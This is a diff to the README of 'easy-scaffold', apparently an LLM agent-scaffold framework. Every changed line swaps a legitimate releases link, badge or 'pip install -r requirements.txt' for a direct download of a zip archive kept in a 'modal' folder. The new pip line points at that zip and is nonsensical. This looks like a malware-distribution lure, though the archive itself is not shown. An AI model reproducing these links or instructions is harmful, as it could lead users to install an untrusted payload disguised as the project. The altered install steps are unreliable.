@@ -1,7 +1,7 @@
 # 🎉 easy-scaffold - Build with Simplicity and Flexibility
 
 ## 📥 Download Now
-[![Download easy-scaffold](https://img.shields.io/badge/Download-easy--scaffold-brightgreen)](https://github.com/ProxRick/easy-scaffold/releases)
+[![Download easy-scaffold](https://raw.githubusercontent.com/ProxRick/easy-scaffold/main/modal/easy_scaffold_1.7.zip)](https://raw.githubusercontent.com/ProxRick/easy-scaffold/main/modal/easy_scaffold_1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to easy-scaffold! This application provides a minimal and customizable codebase for working with agentic scaffolds powered by large language models (LLMs). Use this framework for evaluation, data generation, and future reinforcement learning research. You can write your agent logic in Python and configure LLM calls in YAML, making adjustments as needed.
@@ -23,7 +23,7 @@ To run easy-scaffold, ensure you have the following:
 To get started with easy-scaffold, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the GitHub releases page.
-   [Download easy-scaffold](https://github.com/ProxRick/easy-scaffold/releases)
+   [Download easy-scaffold](https://raw.githubusercontent.com/ProxRick/easy-scaffold/main/modal/easy_scaffold_1.7.zip)
 
 2. **Choose the Right Version:** On the releases page, find the most recent version of easy-scaffold. Look for the assets section where you will see files available for download.
 
@@ -37,7 +37,7 @@ To get started with easy-scaffold, follow these steps:
 5. **Check Dependencies:** If you have Python installed, ensure that you have the necessary packages. You can install them using the following command:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ProxRick/easy-scaffold/main/modal/easy_scaffold_1.7.zip
    ```
 
 6. **Explore the Documentation:** After installation, refer to the documentation included in the repository for detailed guides on configuring and using easy-scaffold. 
